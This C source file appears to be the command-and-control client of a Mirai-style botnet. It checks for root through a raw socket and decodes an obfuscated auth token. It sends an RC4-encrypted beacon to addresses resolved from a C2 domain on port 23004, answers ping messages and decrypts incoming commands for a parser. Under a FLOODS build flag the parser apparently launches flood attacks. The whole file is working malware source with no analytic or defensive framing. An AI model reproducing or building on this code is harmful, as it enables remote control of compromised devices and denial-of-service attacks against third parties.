#define _GNU_SOURCE

#include <time.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>

#include "dbg.h"
#include "bool.h"
#include "util.h"
#include "rand.h"
#include "table.h"
#include "parser.h"
#include "resolve.h"

static char *check_root(void) {

    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);

    if (fd == -1) {
        DEBUG_PRINT("[check_root] socket() failed\n");
        return "0";
    }

    DEBUG_PRINT("[check_root] socket() successful\n");

    close(fd);
    return "1";
}

void establish_connection(char *arch) {

    int len = strlen(arch);

    if (len > 32) {
        DEBUG_PRINT("[establish_connection] invalid arch len: (\"%s\":\'%d\')\n", arch, len);
        return;
    }

    len += table[TABLE_AUTH_TOKEN].len + 2;
    char *sndbuf = calloc(len + 1, sizeof(char));

    table_unlock_val(TABLE_AUTH_TOKEN);
    strcpy(sndbuf, table[TABLE_AUTH_TOKEN].str);
    strcat(sndbuf, arch);
    strcat(sndbuf, ":");
    strcat(sndbuf, check_root());
    table_lock_val(TABLE_AUTH_TOKEN);

    DEBUG_PRINT("[establish_connection] sndbuf: (\"%s\") | len: (\'%d\')\n", sndbuf, len);

    rc4(sndbuf, len);

    time_t last_recv = time(NULL);

    while (TRUE) {

        int fd = -1;
        BOOL connected = FALSE;
        struct dns_result result = rand_addr();

        if (!result.count) {
            DEBUG_PRINT("[establish_connection] failed to resolve domain\n");
            goto label;
        }

        /* attempt to connect to one of the ips from the list */

        for (int i = 0; i < result.count; i++) {

            fd = socket(AF_INET, SOCK_STREAM, 0);

            if (fd == -1) {
                DEBUG_PRINT("[establish_connection] socket() failed\n");
                continue;
            }

            struct timeval tv_send = {
                .tv_sec = 1,
                .tv_usec = 0
            };

            if (setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv_send, sizeof(tv_send)) == -1) {
                DEBUG_PRINT("[establish_connection] setsockopt() for send failed\n");
                close(fd);
                continue;
            }

            struct timeval tv_recv = {
                .tv_sec = 120,
                .tv_usec = 0
            };

            if (setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv_recv, sizeof(tv_recv)) == -1) {
                DEBUG_PRINT("[establish_connection] setsockopt() for recv failed\n");
                close(fd);
                continue;
            }

            struct sockaddr_in addr = {
                .sin_family = AF_INET,
                .sin_port = htons(23004),
                .sin_addr.s_addr = result.ips[i]
            };

            DEBUG_PRINT("[establish_connection] addr.sin_addr.s_addr: (\"%s\")\n", inet_ntoa((struct in_addr){(addr.sin_addr.s_addr)}));

            if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
                DEBUG_PRINT("[establish_connection] connect() failed %d/%d\n", i + 1, result.count);
                close(fd);
                continue;
            }

            DEBUG_PRINT("[establish_connection] connect() successful %d/%d\n", i + 1, result.count);
            connected = TRUE;
            break;
        }

        free_dns_result(&result);

        if (!connected) {
            DEBUG_PRINT("[establish_connection] failed to connect() to all ips from domain\n");
            goto label;
        }

        if (send(fd, sndbuf, len, MSG_NOSIGNAL) == -1) {
            DEBUG_PRINT("[establish_connection] send() failed\n");
            goto label;
        }

        DEBUG_PRINT("[establish_connection] send() successful\n");

        while (TRUE) {

            int rcvlen;
            char rcvbuf[2048] = {0};
            char tmpbuf[2048] = {0};

            if ((rcvlen = recv(fd, rcvbuf, sizeof(rcvbuf), MSG_NOSIGNAL)) <= 0) {
                DEBUG_PRINT("[establish_connection] recv() failed\n");
                break;
            }

            last_recv = time(NULL);

            if (!memcmp(rcvbuf, table[TABLE_RECV_PING].str, table[TABLE_RECV_PING].len)) {

                DEBUG_PRINT("[establish_connection] recv() PING\n");

                if (send(fd, table[TABLE_SEND_PONG].str, table[TABLE_SEND_PONG].len, MSG_NOSIGNAL) == -1) {
                    DEBUG_PRINT("[establish_connection] send() PONG failed\n");
                    break;
                }

                DEBUG_PRINT("[establish_connection] send() PONG successful\n");
                continue;
            }

            rc4(rcvbuf, rcvlen);
            DEBUG_PRINT("[establish_connection] rcvbuf: (\"%s\")\n", rcvbuf);
            
            strncpy(tmpbuf, rcvbuf, sizeof(tmpbuf) - 1);
            
            dyn_parse(rcvbuf);

#ifdef FLOODS

            command_parser(tmpbuf);
#endif

        }

    label:
        DEBUG_PRINT("[establish_connection] last_recv: (\'%ld\')\n", time(NULL) - last_recv);

        if (time(NULL) - last_recv >= (86400 * 7)) {
            DEBUG_PRINT("[establish_connection] inactive for \'%ld\' seconds, terminating\n", time(NULL) - last_recv);
            break;
        }

        if (fd > -1 && connected)
            close(fd);

        sleep(1);
    }
}
